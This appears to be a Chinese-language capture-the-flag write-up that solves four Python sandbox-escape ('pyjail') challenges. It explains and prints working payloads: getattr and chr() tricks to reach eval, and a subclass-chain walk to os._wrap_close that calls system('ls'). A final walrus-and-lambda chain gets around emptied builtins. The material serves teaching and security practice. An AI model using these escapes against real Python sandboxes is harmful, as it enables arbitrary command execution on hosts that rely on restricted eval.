## pyjail1

### 解题思路

禁用了一些非常常见的获取shell的途径，但是我们要知道除了这些还有其他的途径突破防线，比如breakpoint或者help，常见的题目环境help不太行，因为环境没有提供more，less。但是breakpoint是一定可以的。第二题也可以采用相同的解法。（谁说这是非预期啦？）

那么其实这题更希望大家的是了解`__builtins__`是什么以及他的作用，这个是模块，包含许多内置的函数和字符串变量，比如说eval。什么你说eval不能用被ban了？getattr()了解一下，和`.`的区别是一个是静态获取属性，一共是动态获取，不过其参数是字符串，这就意味着问题解决了——我们可以通过将字符串进行拼接的方法任意绕过，非常的简单。比如ev+al就绕过了eval，简简单单。

那么由于可行的payload过多，就随便给一个比较简单的了：`getattr(__builtins__,'eval')(input())`

## pyjail2

### 解题思路

上题说了的方法一直接breakpoint。

方法二，我们现在引号被ban了，是不是没办法拼接字符串了？当然不是，有函数啊，chr()可以将ascii码转为其代表的字符，意味着我们只需要使用数字就可以了。那么同上，将eval改成字符串即可：`getattr(__builtins__,chr(101)+chr(118)+chr(97)+chr(108))(input())`

## pyjail3

### 解题思路

这题ban了内置模块，意味着不能使用内置的一些基本函数和模块，只能使用基本运算和简单类型。

那比较常规的做法便是我们通过继承链去操作，通过一些方式导到object类，然后从object类找到子类中比较好用的几个，比如`<class 'os._wrap_close'>`, `<class '_frozen_importlib.BuiltinImporter'>`等，构造合适的payload。

关于这个列表有这么多子类，如何找的问题，我们可以采用python中的列表推导式（我就不应该把print留给你们的，让你们全都是通过数数具体是第几个下标来看，我算是知道为什么没人做出最后一题了）

那么直接给出脚本：`[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("ls")`

非常的eazy

## pyjail4

### 题目

`assert(c:=input("twice plz > ")).count(".") != 2, eval(c,{'__builtins__':{}})`

### 解题思路

题目真是简洁又明了。

我们知道这题限制了我们只能使用两次点的时候才会触发eval，而内置函数又被清空了，怎么做呢？

首先，内置函数被清空的情况肯定使用继承链，但是，我们获取属性都需要`.`，没有办法抛开，如果想要抛开的话需要使用getattr()函数，但这是内置函数，不存在，也不行。

这个时候，我们其实可以去了解一下实现属性的魔术方法，因为既然都使用继承链了，我们可以使用获取属性的方法也应该是一个基础类的属性或者特殊的类才可以。那我们了解到，函数使用`__getattribute__`和`__getattr__`实现属性的访问，不过注意，实例对象和其他类对象的使用方法参数有一定区别。

但是只有两个点，怎么办？我们知道python中也存在匿名函数，即lambda表达式（我提示了），它不需要使用def这种eval不允许的操作。于是可以构造如下表达式：`lambda a,b:a.__getattribute__(b)`，将其赋值给一个变量名`getattri`，就可以反复利用这个变量，通过类似`getattri('', '__class__')`的方式获取属性了（所以再使用一个解包小技巧，其实一个点就够了，两个纯粹是怕太难）。

又出现了一个问题，赋值操作也不被eval函数允许。这时候我们还知道python3.8引入了海象表达式的机制（我也提示了），使用`:=`是eval所准许的，因为它底层不是赋值操作，本身的功能便有：允许在表达式内部进行赋值，并同时返回被赋的值。那么就更加清晰了。

于是我们的代码可以分几个部分（纯纯是pyjail3的翻版，不过由于object子类属性有极大差别，这里建议一个个尝试，和之前用print出来后数一个逻辑，只不过是盲注）：`ge1=lambda a,b:a.__getattribute__(b)`,`ge2=lambda a,b:a.__getattribute__(a,b)`,`cla=ge2(ge2(ge1('','__class__'),'__base__'),'__subclasses__')()`,`ge1(ge2(cla[161],'__init__'),'__globals__')["system"]("ls")`

最后，问题就是如何把他们拼起来。

简单，列表啊，列表就是会顺序执行你的表达式的。

```python
[ge1:=lambda a,b:a.__getattribute__(b),
ge2:=lambda a,b:a.__getattribute__(a,b),
cla:=ge2(ge2(ge1('','__class__'),'__base__'),'__subclasses__')(),

ge1(ge2(cla[161],'__init__'),'__globals__')["system"]("ls"),
]
```

综上，这题就解完了。

